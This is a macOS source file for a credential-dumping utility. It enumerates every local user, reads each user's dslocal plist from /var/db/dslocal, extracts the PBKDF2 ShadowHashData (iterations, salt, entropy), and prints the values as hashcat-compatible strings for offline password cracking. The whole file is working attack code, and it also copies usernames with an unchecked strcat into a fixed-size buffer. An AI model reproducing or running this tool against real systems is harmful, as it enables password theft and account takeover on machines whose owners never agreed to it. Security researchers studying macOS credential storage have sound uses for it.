#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#import <Foundation/Foundation.h>
#import <CoreServices/CoreServices.h>
#import <Collaboration/Collaboration.h>
#include "helpers.h" // Include the helpers header

/*
    Reads the ShadowHashData part of the dslocal plist and prints a hashcat-compatible string.
*/
void dump_hashes(char* user) {
    // construct the user-specific plist path
    char plist_path[256] = "/var/db/dslocal/nodes/Default/users/";
    strcat(plist_path, user);
    strcat(plist_path, ".plist");

    // read the dsclocal plist
    NSDictionary *plist = [[NSDictionary alloc] initWithContentsOfFile:[NSString stringWithUTF8String:plist_path]];
    if (plist == nil) {
        printf("[-] ShadowHashData's plist not found. are you running as sudo?\n");
        exit(1);
    }

    // extract the ShadowHashData property from the plist
    NSData *shadow_hash_data_property = [[NSData alloc] initWithData:[[plist objectForKey:@"ShadowHashData"] objectAtIndex:0]];

    // convert the plist object to a string
    NSMutableDictionary *shadowHashData = [[NSMutableDictionary alloc] init];
    shadowHashData = [NSPropertyListSerialization propertyListWithData:shadow_hash_data_property options:NSPropertyListMutableContainersAndLeaves format:NULL error:NULL];
    
    // printf("%s\n", user);
    // printf("%s\n", [[shadowHashData description] UTF8String]);
    for(NSString *key in shadowHashData) {
        // work on the nested dictionary that holds the actual data
        if (0 == strcmp([key UTF8String], "SALTED-SHA512-PBKDF2")) {
            // printf("%s\n", [key UTF8String]);

            // get the PBKDF2 which holds all the data we need to extract the hash
            NSDictionary *pbkdf2 = [[NSDictionary alloc] initWithDictionary:[shadowHashData objectForKey:key]];

            // get iterations from PBKDF2
            unsigned int iterations;
            iterations = [[pbkdf2 objectForKey:@"iterations"] intValue];
            
            // get salt from PBKDF2
            char * salt = hexify([[pbkdf2 objectForKey:@"salt"] bytes], [[pbkdf2 objectForKey:@"salt"] length]);
            char * new_salt = (char*)malloc(strlen(salt) + 1); // Allocate memory for new_salt
            strcpy(new_salt, salt);
            free(salt); // Free the original salt

            // get entropy from PBKDF2 - we divide the retrieved result by 2 because hashcat doesn't need more than that
            char * entropy = hexify([[pbkdf2 objectForKey:@"entropy"] bytes], [[pbkdf2 objectForKey:@"entropy"] length]/2);
            
            // print the hashcat-able hash of the user
            // the user     someUser:
            //              $ml
            // iterations   $35513
            // salt         $509e49d6c52559364e1b1c16e7926593c4b07e4b6495b34d6ea0d73d55e22efc
            // entropy      $7ad7393f85b3951f4f10ca17b5915eed42729917d3f19128abfdad488d84110a490127bec845137e23fa0f7de95f1299a4b0c2fba3423e6f6b5d04c1256de91c
            printf("%s:$ml$%d$%s$%s\n\n", user, iterations, new_salt, entropy);
        }
    }
}

/*
    get all users on system that don't begin with _,
    for each user found, pass the username to dump_hashes()
*/
void iterate_users(){
    // query Local Identity Authority for existing local users
    CSIdentityAuthorityRef defaultAuthority = CSGetLocalIdentityAuthority();
    CSIdentityClass identityClass = kCSIdentityClassUser;
    CSIdentityQueryRef query = CSIdentityQueryCreate(NULL, identityClass, defaultAuthority);
    CFErrorRef error = NULL;
    CSIdentityQueryExecute(query, 0, &error);

    // get query results
    CFArrayRef users_queried = CSIdentityQueryCopyResults(query);

    // get number of users
    int users_queried_count = CFArrayGetCount(users_queried);

    // create a users array
    NSMutableArray * users_list = [NSMutableArray array];
    
    // iterate users and save to users array
    for (int i = 0; i < users_queried_count; ++i) {
        CSIdentityRef identity = (CSIdentityRef)CFArrayGetValueAtIndex(users_queried, i);
        CBIdentity * identityObject = [CBIdentity identityWithCSIdentity:identity];
        [users_list addObject:identityObject];
    }

    printf("[+] Dumping hashes..\n");
    for (CBIdentity * user in users_list) {
        const char *c_user = [[user posixName] UTF8String];
        dump_hashes(c_user);
    }

    // release
    CFRelease(users_queried);
    CFRelease(query);
}

int main(){
    iterate_users();
    printf("[+] Done.\n");
    return 0;
}
